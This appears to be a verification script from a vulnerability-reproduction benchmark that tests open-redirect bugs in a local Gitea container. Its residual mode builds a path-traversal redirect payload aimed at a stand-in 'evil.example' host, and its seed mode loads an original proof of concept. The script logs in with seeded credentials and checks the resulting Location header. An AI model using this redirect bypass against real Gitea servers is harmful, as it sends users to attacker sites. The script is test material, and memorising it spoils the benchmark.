#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0=Location contains the run flag  10=blocked/no flag  20=env  30=args
#
# Effect channel = 302 Location from real Gitea RedirectToFirst after login.
# Flag is only the attacker-host label; nothing is planted server-side.
# Probe uses RUN_FLAG; judge uses RUN_FLAG_REF so wrong/stale overrides fail.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
JUDGE="${RUN_FLAG_REF:-$RUN_FLAG}"
SEED_USER="${SEED_USER:-pcbuser}"
SEED_PASS="${SEED_PASS:-pcbpassword123}"
mkdir -p "$WORK_DIR"
export CASE_DIR RUN_FLAG

if [[ "$MODE" == "--seed" ]]; then
  # CVE-2022-1058: leading /\ scheme-relative redirect_to.
  REDIRECT_TO="$("$PY" -c "
import importlib.util, os
p = os.path.join(os.environ['CASE_DIR'], 'poc', 'original_poc.py')
spec = importlib.util.spec_from_file_location('original_poc', p)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
print(mod.candidate(os.environ['RUN_FLAG'])['redirect_to'])
")"
  [[ -n "$REDIRECT_TO" ]] || { echo "verify: seed candidate empty" >&2; exit 20; }
else
  # CVE-2026-25779: /x/../\\host beats loc[0]=='/' && loc[1] in '/\\' via path.Clean.
  REDIRECT_TO="/x/../\\${RUN_FLAG}.evil.example"
fi

PORT=""
for _ in $(seq 1 30); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    port "$VERSION" 3000 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -n "$PORT" ]]; then
    code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 \
      "http://127.0.0.1:${PORT}/user/login" || true)"
    if [[ "$code" == "200" ]]; then
      break
    fi
  fi
  sleep 1
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published $VERSION:3000" >&2; exit 20; }

ENC="$("$PY" -c "from urllib.parse import quote; import sys; print(quote(sys.argv[1], safe=''))" "$REDIRECT_TO")"
GET_URL="http://127.0.0.1:${PORT}/user/login?redirect_to=${ENC}"
POST_URL="http://127.0.0.1:${PORT}/user/login"

STATUS=""
LOC=""
for _attempt in 1 2 3 4 5 6; do
  JAR="$(mktemp)"
  HTML="$(curl -sS -m 15 -c "$JAR" "$GET_URL" || true)"
  CSRF="$("$PY" -c "
import re, sys
html = sys.argv[1]
m = re.search(r'name=\"_csrf\"\\s+value=\"([^\"]*)\"', html) or re.search(r'value=\"([^\"]*)\"\\s+name=\"_csrf\"', html)
print(m.group(1) if m else '')
" "$HTML")"
  POST_ARGS=(curl -sS -m 15 -b "$JAR" -c "$JAR" -D - -o /dev/null
    --data-urlencode "user_name=${SEED_USER}"
    --data-urlencode "password=${SEED_PASS}")
  if [[ -n "$CSRF" ]]; then
    POST_ARGS+=(--data-urlencode "_csrf=${CSRF}")
  fi
  POST_ARGS+=("$POST_URL")
  HDRS="$("${POST_ARGS[@]}" || true)"
  rm -f "$JAR"
  PARSED="$("$PY" -c "
import sys
raw = sys.argv[1]
lines = [ln.rstrip('\r') for ln in raw.splitlines()]
status = lines[0] if lines else ''
loc = ''
for line in lines:
    low = line.lower()
    if low.startswith('http/'):
        parts = line.split()
        if len(parts) >= 2:
            status = parts[1]
    if low.startswith('location:'):
        loc = line.split(':', 1)[1].strip()
print(status)
print(loc)
" "$HDRS")"
  STATUS="$(printf '%s\n' "$PARSED" | sed -n '1p')"
  LOC="$(printf '%s\n' "$PARSED" | sed -n '2p')"
  if [[ -n "$STATUS" && "$STATUS" != "000" ]]; then
    break
  fi
  sleep 0.5
done

echo "mode=${MODE#--} status=${STATUS} location=${LOC:0:240}"
if [[ -z "$STATUS" || "$STATUS" == "000" ]]; then
  echo "verify: login POST produced no HTTP status" >&2
  exit 20
fi
if [[ -n "$JUDGE" && "$LOC" == *"$JUDGE"* ]]; then
  exit 0
fi
exit 10
